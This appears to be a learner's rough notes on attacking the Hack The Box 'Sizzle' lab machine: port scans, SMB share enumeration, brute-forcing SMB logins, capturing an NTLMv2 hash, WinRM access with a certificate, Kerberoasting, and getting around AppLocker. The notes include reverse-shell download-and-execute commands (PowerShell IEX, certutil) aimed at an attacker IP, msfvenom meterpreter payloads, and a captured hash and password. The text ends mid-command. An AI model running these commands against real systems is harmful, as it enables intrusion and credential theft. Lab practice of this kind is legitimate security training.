	"content": " NMAP\n# Nmap 7.70 scan initiated Fri Feb 15 14:24:35 2019 as: nmap -T4 -sC -sV -oA nmap/initial 10.10.10.103 Nmap scan report for 10.10.10.103 Host is up (0.050s latency). Not shown: 987 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 53/tcp open domain? | fingerprint-strings: | DNSVersionBindreqTCP: | version |_ bind 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn't have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)  PART2\n| ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-02-15T19:21:52+00:00; -5m09s from scanner time. 443/tcp open ssl/http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn't have a title (text/html). | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-02-15T19:21:51+00:00; -5m09s from scanner time. | tls-alpn: | h2 |_ http/1.1 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-02-15T19:21:52+00:00; -5m08s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55  PART3\n|_ssl-date: 2019-02-15T19:21:51+00:00; -5m08s from scanner time. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nma p.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.70%I=7%D=2/15%Time=5C671205%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindreqTCP,20,\u0026quot;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\u0026quot;); Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -5m08s, deviation: 0s, median: -5m09s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2019-02-15 14:21:52 |_ start_date: 2019-02-10 22:06:16 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Feb 15 14:27:40 2019 -- 1 IP address (1 host up) scanned in 185.95 seconds  UDP\n# Nmap 7.70 scan initiated Fri Feb 15 14:29:03 2019 as: nmap -T4 -sU -oA nmap/udp 10.10.10.103 Nmap scan report for 10.10.10.103 Host is up (0.043s latency). Not shown: 997 open|filtered ports PORT STATE SERVICE 123/udp open ntp 389/udp open ldap 65024/udp open unknown  TOTAL\nnmap -sT -T5 -p- -Pn -oA nmap/total 10.10.10.103 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-15 14:47 EST Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 0.54% done Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 0.81% done Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 1.65% done; ETC: 14:52 (0:04:59 remaining) Nmap scan report for 10.10.10.103 Host is up (0.044s latency). Not shown: 65506 filtered ports PORT STATE SERVICE 21/tcp open ftp 53/tcp open domain 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 443/tcp open https 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 5986/tcp open wsmans 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49667/tcp open unknown 49670/tcp open unknown 49677/tcp open unknown 49679/tcp open unknown 49680/tcp open unknown 49682/tcp open unknown 49685/tcp open unknown 49695/tcp open unknown 49707/tcp open unknown 59598/tcp open unknown  NMAP SMP SCRIPT SCAN\nfor some reason the script doens\u0026rsquo;t return much information. just enumerating the shares with null sessions isn\u0026rsquo;t enough.\nnmap --script smb-enum-shares -p 139,445 10.10.10.103  nmap --script smb-vuln* -p 138,139,445 -oA nmap/smb_vulns 10.10.10.103 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-22 19:51 EST Nmap scan report for sizzle.htb (10.10.10.103) Host is up (0.077s latency). PORT STATE SERVICE 138/tcp filtered netbios-dgm 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server disconnected the connection Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds  DIG\nsizzle.htb still check subdomains with wfuzz.\ndig sizzle.htb ANY @10.10.10.103 [25/256] ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.11.5-P1-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; sizzle.htb ANY @10.10.10.103 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: SERVFAIL, id: 21252 ;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4000 ; COOKIE: bee98158bf1d22d6 (echoed) ;; QUESTION SECTION: ;sizzle.htb. IN ANY ===ANSWER ;; Query time: 1347 msec ;; SERVER: 10.10.10.103#53(10.10.10.103) ;; WHEN: Fri Feb 15 15:04:13 EST 2019 ;; MSG SIZE rcvd: 51  SUBDOMAINS WITH WFUZZ\nwfuzz -c -f sub-sizzle -w /home/htb/wordlist/seclist/Discovery/DNS/subdomains-top1mil-5000.txt -u \u0026quot;http://sizzle.htb\u0026quot; -H \u0026quot;Host: FUZZ.sizzle.htb\u0026quot; -t 42 --hc 404  GOBUSTER 10.10.10.103\n/images (Status: 301) /Images (Status: 301) /IMAGES (Status: 301)  WFUZZ\nno returns with wfuzz fuzzed subdomains \u0026amp; root\nwfuzz -c -f sub-sizzle -w /home/htb/wordlist/seclist/Discovery/DNS/fierce-hostlist.txt -u \u0026quot;http://sizzle.\u0026quot; -H \u0026quot;Host: sizzle.FUZZ\u0026quot; -t 42 --hc 404  wfuzz -c -f sub-sizzle -w /home/htb/wordlist/seclist/Discovery/Web-Content/ -u \u0026quot;https://sizzle.htb\u0026quot; -H \u0026quot;Host: FUZZ.sizzle.htb\u0026quot; -t 42 --hc 404  SMBMAP\nsmbmap -H 10.10.10.103 -u guest -R / to list all path recursivley smbmap -H 10.10.10.103 -u guest -R /  return\nADMIN$ NO ACCESS C$ NO ACCESS CertEnroll NO ACCESS Department Shares READ ONLY IPC$ READ ONLY Department Shares READ ONLY NETLOGON NO ACCESS Operations NO ACCESS SYSVOL NO ACCESS  Department Shares\n dr--r--r-- 0 Mon Jul 2 15:21:43 2018 Accounting dr--r--r-- 0 Mon Jul 2 15:14:28 2018 Audit dr--r--r-- 0 Tue Jul 3 11:22:39 2018 Banking dr--r--r-- 0 Mon Jul 2 15:15:01 2018 CEO_protected dr--r--r-- 0 Mon Jul 2 15:22:06 2018 Devops dr--r--r-- 0 Mon Jul 2 15:11:57 2018 Finance dr--r--r-- 0 Mon Jul 2 15:16:11 2018 HR dr--r--r-- 0 Mon Jul 2 15:14:24 2018 Infosec dr--r--r-- 0 Mon Jul 2 15:13:59 2018 Infrastructure dr--r--r-- 0 Mon Jul 2 15:12:04 2018 IT dr--r--r-- 0 Mon Jul 2 15:12:09 2018 Legal dr--r--r-- 0 Mon Jul 2 15:15:25 2018 M\u0026amp;A dr--r--r-- 0 Mon Jul 2 15:14:43 2018 Marketing dr--r--r-- 0 Mon Jul 2 15:11:47 2018 R\u0026amp;D dr--r--r-- 0 Mon Jul 2 15:14:37 2018 Sales dr--r--r-- 0 Mon Jul 2 15:21:46 2018 Security dr--r--r-- 0 Mon Jul 2 15:16:54 2018 Tax dr--r--r-- 0 Tue Jul 10 17:39:32 2018 Users dr--r--r-- 0 Mon Jul 2 15:32:58 2018 ZZ_ARCHIVE  .\\\\Banking\\ dr--r--r-- 0 Tue Jul 3 11:22:39 2018 . dr--r--r-- 0 Tue Jul 3 11:22:39 2018 .. dr--r--r-- 0 Tue Jul 3 11:23:46 2018 Offshore   .\\\\Banking\\Offshore\\ dr--r--r-- 0 Tue Jul 3 11:23:46 2018 . dr--r--r-- 0 Tue Jul 3 11:23:46 2018 .. dr--r--r-- 0 Tue Jul 3 11:23:29 2018 Clients dr--r--r-- 0 Tue Jul 3 11:23:46 2018 Data dr--r--r-- 0 Tue Jul 3 11:23:36 2018 Dev dr--r--r-- 0 Tue Jul 3 11:23:16 2018 Plans dr--r--r-- 0 Tue Jul 3 11:23:39 2018 Sites   .\\\\HR\\ dr--r--r-- 0 Mon Jul 2 15:16:11 2018 . dr--r--r-- 0 Mon Jul 2 15:16:11 2018 .. dr--r--r-- 0 Mon Jul 2 15:15:49 2018 Benefits dr--r--r-- 0 Mon Jul 2 15:16:03 2018 Corporate Events dr--r--r-- 0 Mon Jul 2 15:15:57 2018 New Hire Documents dr--r--r-- 0 Mon Jul 2 15:15:42 2018 Payroll dr--r--r-- 0 Mon Jul 2 15:16:11 2018 Policies   .\\\\Tax\\ dr--r--r-- 0 Mon Jul 2 15:16:54 2018 . dr--r--r-- 0 Mon Jul 2 15:16:54 2018 .. dr--r--r-- 0 Mon Jul 2 15:16:34 2018 2010 dr--r--r-- 0 Mon Jul 2 15:16:36 2018 2011 dr--r--r-- 0 Mon Jul 2 15:16:38 2018 2012 dr--r--r-- 0 Mon Jul 2 15:16:39 2018 2013 dr--r--r-- 0 Mon Jul 2 15:16:43 2018 2014 dr--r--r-- 0 Mon Jul 2 15:16:45 2018 2015 dr--r--r-- 0 Mon Jul 2 15:16:49 2018 2016 dr--r--r-- 0 Mon Jul 2 15:16:52 2018 2017 dr--r--r-- 0 Mon Jul 2 15:16:54 2018 2018   .\\\\Users\\ dr--r--r-- 0 Tue Jul 10 17:39:32 2018 . dr--r--r-- 0 Tue Jul 10 17:39:32 2018 .. dr--r--r-- 0 Mon Jul 2 15:18:43 2018 amanda dr--r--r-- 0 Mon Jul 2 15:19:06 2018 amanda_adm dr--r--r-- 0 Mon Jul 2 15:18:28 2018 bill dr--r--r-- 0 Mon Jul 2 15:18:31 2018 bob dr--r--r-- 0 Mon Jul 2 15:19:14 2018 chris dr--r--r-- 0 Mon Jul 2 15:18:39 2018 henry dr--r--r-- 0 Mon Jul 2 15:18:34 2018 joe dr--r--r-- 0 Mon Jul 2 15:18:53 2018 jose dr--r--r-- 0 Tue Jul 10 17:39:32 2018 lkys37en dr--r--r-- 0 Mon Jul 2 15:18:48 2018 morgan dr--r--r-- 0 Mon Jul 2 15:19:20 2018 mrb3n dr--r--r-- 0 Wed Sep 26 01:45:32 2018 Public  smbclient\nsmbclient '\\\\\\\\10.10.10.103\\\\Department shares'  Found some more tools on 0xdf website https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html\nenum4linux honstest i have no idea what the output is telling me on for sizzle.\nenum4linux -k guest -w 'IPC$' -a 10.10.10.103  -a Do all simple enumeration (-U -S -G -P -r -o -n -i). This opion is enabled if you don't provide any other options. -k user -w workgroup  nmblookup\nReturned no reply\nnmblookup -A 10.10.10.103  FTP\nI\u0026rsquo;m not sure what smb has to offer besides possible usernames. I would like to note lkys37en was createdjuly the 10th. Now going to investigate the ftp server. i get an error with anonymous login.\nWARNING FTP SAYS ITS RUNNING WINDOWS_NT\nSo there are credentials somewhere, i beleive that one of the users might have access and perhaps a weak password. I tried using hydra to brutefrce smb login but it didn\u0026rsquo;t do very well. Metasploit smb auxiarly module was able to fuzz the smb shares effectivily. I made a password and user list. I thought the last lyk being added july 10th was odd and also the spelling which might be a password as well.\nmsf5 \u0026gt; use auxiliary/s Display all 624 possibilities? (y or n) msf5 \u0026gt; use auxiliary/scanner/smb/smb_login  msf5 auxiliary(scanner/smb/smb_login) \u0026gt; set USERPASS_FILE /home/htb/boxes/sizzle/Creds/smb- smb-password USERPASS_FILE =\u0026gt; /home/htb/boxes/sizzle/Creds/smb-password msf5 auxiliary(scanner/smb/smb_login) \u0026gt; set USER_FILE /home/htb/boxes/sizzle/Creds/smb-user-creds USER_FILE =\u0026gt; /home/htb/boxes/sizzle/Creds/smb-user-creds [-] Auxiliary failed: Msf::OptionValidateError The following options failed to validate: RHOSTS. msf5 auxiliary(scanner/smb/smb_login) \u0026gt; set rhosts 10.10.10.103 rhosts =\u0026gt; 10.10.10.103 msf5 auxiliary(scanner/smb/smb_login) \u0026gt; run [*] 10.10.10.103:445 - 10.10.10.103:445 - Starting SMB login bruteforce [+] 10.10.10.103:445 - 10.10.10.103:445 - Success: '.\\lkys37en:' [*] 10.10.10.103:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed  type creds to view the password\nmrb2n \u0026amp; l7ks37en are the creators.\nIm trying to connect to w*m service using aa c*rt, any suggest?\nAny thoughts how to request a certificate? I imported root cert and crls, but a****a doesn\u0026rsquo;t have an access to certsrv Edit: I messed with dns, now it works from other rabbit hole ideas.\nMounthing shares\ni had some problems getting this to work. please check out smb undertools.\nmount -o user=guest '//10.10.10.103/Department Shares' /mnt/sizzle  Going to write a bash script to check if the shares are writeable.\ntouch, print message, delete file  for folder in /mnt/sizzle/*; do touch \u0026quot;$folder\u0026quot;; done  for folder in /mnt/sizzle/**/*; do touch \u0026quot;$folder\u0026quot;; done  Another way to enumerate shares\ntouch all folders in a directory then look at the timestamp and see which ones are wwriteable.\ntouch ./*  recursive search\nusers dir\npublic is not present above. enumerating smb shares is lame. i hate it.\nMOUNTHING SHARES\nSo i vaguely remember this from nightmare. i didn\u0026rsquo;t take notes\n[+] Listening for events... [SMBv2] NTLMv2-SSP Client : 10.10.10.103 [SMBv2] NTLMv2-SSP Username : HTB\\amanda [SMBv2] NTLMv2-SSP Hash : amanda::HTB:792c3f0c11fda1d4:9B57683DA7D562DF91A178A92FF0F32B:0101000000000000C0653150DE09D201B71A89F9869E3EEF000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000C98601829F12999A43BF5CFEEAEBE2077928BBB6FD403483E77BE66CE1B2054F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003400000000000000000000000000  Amanda\nBasically repeating the step above but for amanda.\nsmbmap -u amanda -p Ashare1972 -H 10.10.10.103 -r  [+] Finding open SMB ports.... [+] User SMB session establishd on 10.10.10.103... [+] IP: 10.10.10.103:445 Name: sizzle.htb Disk Permissions ---- ----------- ADMIN$ NO ACCESS C$ NO ACCESS CertEnroll READ ONLY Department Shares READ ONLY IPC$ READ ONLY NETLOGON READ ONLY Operations NO ACCESS SYSVOL READ ONLY  Webserver!!!!\n ADMIN$ NO ACCESS C$ NO ACCESS CertEnroll READ ONLY ./ dr--r--r-- 0 Thu Feb 28 03:21:14 2019 . dr--r--r-- 0 Thu Feb 28 03:21:14 2019 .. fr--r--r-- 721 Thu Feb 28 03:21:14 2019 HTB-SIZZLE-CA+.crl fr--r--r-- 909 Mon Feb 25 03:20:39 2019 HTB-SIZZLE-CA.crl fr--r--r-- 322 Mon Jul 2 16:36:05 2018 nsrev_HTB-SIZZLE-CA.asp fr--r--r-- 871 Mon Jul 2 16:36:03 2018 sizzle.HTB.LOCAL_HTB-SIZZLE-CA.crt   NETLOGON READ ONLY ./ dr--r--r-- 0 Mon Jul 2 14:56:57 2018 . dr--r--r-- 0 Mon Jul 2 14:56:57 2018 .. Operations NO ACCESS SYSVOL READ ONLY ./ dr--r--r-- 0 Mon Jul 2 14:56:57 2018 . dr--r--r-- 0 Mon Jul 2 14:56:57 2018 .. dr--r--r-- 0 Mon Jul 2 14:56:57 2018 HTB.LOCAL  mount -o user=amanda '//10.10.10.103/Shares' /mnt/sizzle password =\tAshare1972  Found some certs in the cert smb share. im not quite sure what to do with them. i believe kururious. The certs might be related to ldap.\nsmbmap  GetUserSPNs.py -request -dc-ip 10.10.10.103 sizzle.htb/ GetUserSPNs.py -request -dc-ip 10.10.10.103 HTB.local/amanda  if each phase of discovery in the smb is the next step department shares is done. netlogon and sysvol cert enroll are new. At this point we have Creds and some CA files.\nExploring SYSVOL\nsmbclient -U amanda '\\\\10.10.10.103\\SYSVOL'  Checking for write permissions\nI think this is related to active directory based on my google searches.\nmount -o user=amanda '//10.10.10.103/SYSVOL' /mnt/sizzle  add ** for each additionall path youd like to enumerate. for folder in /mnt/sizzle/**/*; do touch \u0026quot;$folder\u0026quot;; done  touch: setting times of '/mnt/sizzle/HTB.LOCAL/DfsrPrivate': Permission denied touch: setting times of '/mnt/sizzle/HTB.LOCAL/Policies': Permission denied touch: setting times of '/mnt/sizzle/HTB.LOCAL/scripts': Permission denied  Checking NETLOGON\nNothing in here, not writeable. =[]\nmount -o user=amanda '//10.10.10.103/NETLOGON' /mnt/sizzle  BACKTOBURP\nlets examine the aviable methods.\nHTTP/1.1 200 OK Allow: OPTIONS, TRACE, GET, HEAD, POST Server: Microsoft-IIS/10.0 Public: OPTIONS, TRACE, GET, HEAD, POST X-Powered-By: ASP.NET Date: Fri, 01 Mar 2019 21:01:09 GMT Connection: close Content-Length: 0  WFUZZ for wierd directories\nwfuzz --hc 404 -c -w /seclist/Discovery/Web-Content/iis.txt -u \u0026quot;http://sizzle.htb/FUZZ\u0026quot;  Returns aspnet_client  wfuzz --hc 404 -c -w /home/htb/wordlist/seclist/Discovery/Web-Content/iis.txt -u \u0026quot;http://sizzle.htb/aspnet_client/FUZZ\u0026quot;  returns system_web  burp didn\u0026rsquo;t return anything initially. same old forbidden but no session tokens.\nFuzzing for some simple post params\nwfuzz --hh 1293 -c -w /home/htb/wordlist/seclist/Discovery/Web-Content/burp-parameter-names.txt -d \u0026quot;FUZZ=junk\u0026quot; 'http://sizzle.htb/aspnet_client/system_web'  Gobuster\n/certenroll sounds like certen troll\n/certsrv is the website using the creds found in the smb shares.\ngobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.103/aspnet_client/system_web/ -t 40 -x aspx,php,asp,net  Microsoft Active Directory Certificate Services\nWindows server 2003 r2 \u0026amp; sp1. manages certicates for software security systems that employ pbulic key technology. So it would seem this manages the Active Directory certificates. luckily i don\u0026rsquo;t know anything about Active Directory certificates.\nMY default instinct is this is some kind of kurburos attack; or the website is vulnerable.\nAparently NTLMV2 is the other authentication mechanicism for windows verification. This protocol uses windows NT and LM hashes to encrypt traffic.\nhttps://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html\nWINRM\nrunning ruby winrm ran into a bump had to install rubies winrm module.\nget install winrm  knowing very little about windows remote management service. I felt the need to use nmap again to scan it. It return some information i wasn\u0026rsquo;t aware of 5986 is ssl version and 5985 us http. It also returns some version information httpd2.0.\nso ive been poking around with the certifacate authority thing. while im close i cna\u0026rsquo;t authenticate to windows remote management.\ninstalled certutil to try and extract the key and cer from cert9.db\npk12util -h Usage: pk12util -i importfile [-d certdir] [-P dbprefix] [-h tokenname] [-k slotpwfile | -K slotpw] [-w p12filepwfile | -W p12filepw] [-v] Usage: pk12util -l listfile [-d certdir] [-P dbprefix] [-h tokenname] [-k slotpwfile | -K slotpw] [-w p12filepwfile | -W p12filepw] [-v] Usage: pk12util -o exportfile -n certname [-d certdir] [-P dbprefix] [-c key_cipher] [-C cert_cipher] [-m | --key_len keyLen] [--cert_key_len certKeyLen] [-v] [-k slotpwfile | -K slotpw] [-w p12filepwfile | -W p12filepw]  i have no idea why the above didn\u0026rsquo;t work but i did some more digging and i think i was able to find what i need. The next part will cover exporting the cert.\nOPENSSL So i used openssl to extract the key from amanda.p12. Which i thought was odd because i thought certutil would of been easier to use. Examining the key note the friendlyname \u0026amp; the ID which i believe might be the piece i was missing certutil and pk12.\nopenssl pkcs12 -in amanda.p12 -out goldkey.txt  +++\nACCESS Get the cert from firefox.\nOPENSSL\nopenssl pkcs12 -in amanda.p12 -nocerts -out amanda.key  openssl pkcs12 -in amanda.p12 -clcerts -nokeys -out amanda.crt  CHANGES MADE TO WINRM RUBY\nI\u0026rsquo;m not sure why the my connection kept closing and i had to retype the darn passphrase hundreds of times. So i went looking for away to fix this annonyans. key_pass was the solution.\nhttp://paste.openstack.org/show/197184/\nconn = WinRM::Connection.new( endpoint: 'https://10.10.10.103:5986/wsman', transport: :ssl, client_cert: 'amanda_crt.pem', client_key: 'amanda_key.pem', key_pass: 'Ashare1972', # user: 'amanda' # password: 'Ashare1972', :no_ssl_peer_verification =\u0026gt; true )  ESCAPING\nIn a constrained shell. below i talk about new-object being restricted this is the coluprated windows defender. I can upload files using the smb shares. I can try upload taskil to kill windows defender.\nCannot create type. Only core types are supported in this language mode.  INVOKER\nTheres some kind of appblocker disabling New-Object form being run. I tried to bypas this using different version of powershell but in hindsight. I\u0026rsquo;m not sure what i would need to upgrade the shell. I could look through the system and find another cert to upgrade my user.\nC:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.14/Invoke-PowerShellTcp.ps1')  C:\\WINDOWS\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.14/Invoke-PowerShellTcp.ps1')  CERTUTILS\nfortied again app blocker\ncertutil --urlcache -split -f http://10.10.14.14/Invoke-PowerShellTcp.ps1  Whoami /priv Bypass Traverse checking enabled is bad this is the attack i tried to use in optimium that requires two cores. I can\u0026rsquo;t upload the exploit because of app blocker. Accountprivlege\nwhoami /priv Enter PEM pass phrase: PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  NETSTAT\ncan\u0026rsquo;t really view the output of -ant the output is way to lengthy. Theres allot of udp ports open. running netstat -a switch revealed port 88 is open. I ran into an issue iwth buffer history size with tmux. theres one port open that sticks out port 88.\nUDP\n[dead:beef::286e:81b7:187:5754]:88  port 88 is assiociated with kurburous. why is the kurburous assiociated with ipv6, but it is not assiociated with ipv4. This would be logical next step.\nLDAP\n####This is important####\nnmap return port 389 tcp which is the ldap port. I wasn\u0026rsquo;t aware that this might solicate the domainname.\nHTB.local  389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)  Gathering information of kerbroast\nFinding service accounts\nsetspn -T DOMAINNAME -F -Q */*  -F = perform queries at the forest, rather than domain level.  ​ -T = perform query on the speicified domain or forest.(when -F is also user)\n​ -Q = query for existence of SPN\nThe user certs seem more intersting than the sizzle certs.\nsetspn -T * -F -Q */* Checking forest DC=HTB,DC=LOCAL CN=SIZZLE,OU=Domain Controllers,DC=HTB,DC=LOCAL Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/sizzle.HTB.LOCAL ldap/sizzle.HTB.LOCAL/ForestDnsZones.HTB.LOCAL ldap/sizzle.HTB.LOCAL/DomainDnsZones.HTB.LOCAL DNS/sizzle.HTB.LOCAL GC/sizzle.HTB.LOCAL/HTB.LOCAL RestrictedKrbHost/sizzle.HTB.LOCAL RestrictedKrbHost/SIZZLE RPC/717ef311-0653-41c6-8db6-81526d6f4985._msdcs.HTB.LOCAL HOST/SIZZLE/HTB HOST/sizzle.HTB.LOCAL/HTB HOST/SIZZLE HOST/sizzle.HTB.LOCAL HOST/sizzle.HTB.LOCAL/HTB.LOCAL E3514235-4B06-11D1-AB04-00C04FC2DCD2/717ef311-0653-41c6-8db6-81526d6f4985/HTB.LOCAL ldap/SIZZLE/HTB ldap/717ef311-0653-41c6-8db6-81526d6f4985._msdcs.HTB.LOCAL ldap/sizzle.HTB.LOCAL/HTB ldap/SIZZLE ldap/sizzle.HTB.LOCAL ldap/sizzle.HTB.LOCAL/HTB.LOCAL CN=krbtgt,CN=Users,DC=HTB,DC=LOCAL kadmin/changepw CN=mrlky,CN=Users,DC=HTB,DC=LOCAL http/sizzle Existing SPN found!  i believe this pulls up domain related to a user\nsetspn -s HOST/sizzle.HTB.LOCAL/HTB amanda setspn -s domainname username  Requesting a ticket\nAdd-Type -AssemblyName System.IdentityModel  New-Object System.IdentityModel.Tokens.KerberosRequestSecurityToken -ArgumentList \u0026quot;http/sizzle\u0026quot;  request mass quantities of tickets\nAdd-Type -AssemblyName System.IdentityModel  this one has new-object but i bet the output would of been kewl. i think this is why new-object is restricted. probably allot of reason why.\nsetspn.exe -T SIZZLE -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken-ArgumentList $_.Context.PostContext[0].Trim() }  Why the kerbroast attack work is that windows domains there is only ONE NTLM Hash\nGetUserSPNs.py\n GetUserSPNs.py -request -dc-ip 10.10.10.103 kadmin/changepw -save -outputfile GetUserSPNs.out    TRansfer rounder payloads\nPsBypassCLM.exe\nThis didn\u0026rsquo;t work for some rean; it would just hang.\nso uploading the payload using smb then moving it to one of the writeable directories i choice. it is the same directory used in ippsec video but i tried others. lol\nhttps://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md\nsmbclient -U amanda '\\\\10.10.10.103\\Department Shares\\' put PsBypassCLM.exe  C:\\Windows\\System32\\spool\\drivers\\color  msfvenom payload\ni can\u0026rsquo;t seem to get msbuild to compile the payload on the target. im not sure what im doing wrong but it gives me an error. i had thought it was the os version i was using. further looking into this and i believe i was wrong. somehting about how im editing the file is wrong. i also tried uploading my own msbuild\nmsfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.49 LPORT=443 -f csharp msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.49 LPORT=443 -f csharp -o chicken.csproj  cp 'c:\\Department Shares\\Users\\Public\\chicken64-edit.csproj' c:\\windows\\system32\\spool\\drivers\\color\\  errors errors\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe chicken64.csproj C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe chicken64-edit.csproj  OTHER WAYS TO BYPASS\nreg query \u0026quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\u0026quot; HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\CDF HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.0 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.5 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4.0  After getting watson all setup following 0xdf guide on devel. it wont run because it doens\u0026rsquo;t have access to systeminfo my best guess or i compiled it wrong. I also ran sherlock it returned everything as not vulnerable. I\u0026rsquo;m starting to doubt the valitity of my shell.\nI was able to get a shell that improved my sisution escaping out fo the consrained laguage limitiations. Invoke a nishangshell which aren\u0026rsquo;t that good so maybe thats the issue. i could upload a meterpreter shell.\nused to check if you are in a constrainted shell\n$ExecutionContext.SessionState.LanguageMode  You don\u0026rsquo;t have to upload anything to get this to work which is nice.\ncd c:\\Windows\\System32\\spool\\drivers\\color\\  PowerShell -Version 2 -ExecutionPolicy ByPass -command \u0026quot;IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.49/Invoke-PowerShellTcp.ps1')\u0026quot;  this will work as a bypass.\nPowerShell -Version 2 -ExecutionPolicy ByPass -File .\\meow.ps1  https://github.com/Cn33liz/MSBuildShellhttps://github.com/Cn33liz/MSBuildShell\ni couldn\u0026rsquo;t get msbuild to work.\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe C:\\Windows\\System32\\spool\\drivers\\color\\MSBuildShell.csproj  PowerShell -Version 2 -ExecutionPolicy ByPass -command \u0026quot;IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.49/Invoke-PowerShellTcp.ps1')\u0026quot; PowerShell -Version 2 -ExecutionPolicy ByPass -command \u0026quot;IEX(New-Object 